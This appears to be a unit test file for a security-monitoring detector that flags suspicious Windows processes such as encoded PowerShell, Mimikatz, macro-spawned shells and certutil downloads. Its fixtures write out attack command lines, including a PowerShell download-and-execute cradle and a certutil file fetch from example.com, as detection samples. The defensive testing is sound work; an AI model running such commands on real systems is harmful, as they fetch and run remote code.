"""Unit tests for the suspicious-process detector (rule SP-001)."""
from __future__ import annotations

from pysoc.detect import SuspiciousProcessDetector
from pysoc.models import Severity


def test_detects_encoded_powershell(encoded_powershell_event):
    alerts = SuspiciousProcessDetector().analyze([encoded_powershell_event])
    assert len(alerts) == 1
    a = alerts[0]
    assert a.rule_id == "SP-001"
    assert a.severity == Severity.HIGH
    assert "encoded_powershell" in a.context["matched_patterns"]
    assert "T1059.001" in a.context["mitre_attack_ids"]
    # Decoded payload should be present and start with "Write-Host".
    assert a.context["decoded_payload"].startswith("Write-Host")


def test_detects_mimikatz(mimikatz_event):
    alerts = SuspiciousProcessDetector().analyze([mimikatz_event])
    assert len(alerts) == 1
    a = alerts[0]
    assert a.severity == Severity.CRITICAL
    assert "mimikatz" in a.context["matched_patterns"]
    assert "T1003.002" in a.context["mitre_attack_ids"]


def test_detects_suspicious_parent_child(macro_word_to_powershell_event):
    alerts = SuspiciousProcessDetector().analyze([macro_word_to_powershell_event])
    assert len(alerts) == 1
    a = alerts[0]
    # Should match BOTH encoded_powershell AND parent_child (severity = HIGH).
    assert "encoded_powershell" in a.context["matched_patterns"] or \
           "powershell_download_cradle" in a.context["matched_patterns"] or \
           any("suspicious_parent_child" in p for p in a.context["matched_patterns"])


def test_no_alert_for_benign_process():
    from tests.conftest import E
    benign = E(
        source_type="windows_json",
        user_name="alice",
        event_action="process_create",
        event_outcome="success",
        process_name="notepad.exe",
        process_parent_name="explorer.exe",
        process_command_line="notepad.exe C:\\Users\\alice\\notes.txt",
    )
    alerts = SuspiciousProcessDetector().analyze([benign])
    assert alerts == []


def test_no_alert_for_non_process_events(brute_force_events):
    """Login events must not trigger the suspicious-process detector."""
    alerts = SuspiciousProcessDetector().analyze(brute_force_events)
    assert alerts == []


def test_detects_download_cradle():
    from tests.conftest import E
    evt = E(
        source_type="windows_json",
        user_name="admin",
        event_action="process_create",
        event_outcome="success",
        process_name="powershell.exe",
        process_parent_name="cmd.exe",
        process_command_line=(
            "powershell.exe -nop -c IEX (New-Object Net.WebClient).DownloadString("
            "'http://example.com/payload.ps1')"
        ),
    )
    alerts = SuspiciousProcessDetector().analyze([evt])
    assert len(alerts) == 1
    assert "powershell_download_cradle" in alerts[0].context["matched_patterns"]


def test_detects_certutil():
    from tests.conftest import E
    evt = E(
        source_type="windows_json",
        user_name="admin",
        event_action="process_create",
        event_outcome="success",
        process_name="certutil.exe",
        process_parent_name="cmd.exe",
        process_command_line="certutil.exe -urlcache -split -f http://example.com/file.txt C:\\Temp\\file.txt",
    )
    alerts = SuspiciousProcessDetector().analyze([evt])
    assert len(alerts) == 1
    assert "certutil_loldb" in alerts[0].context["matched_patterns"]
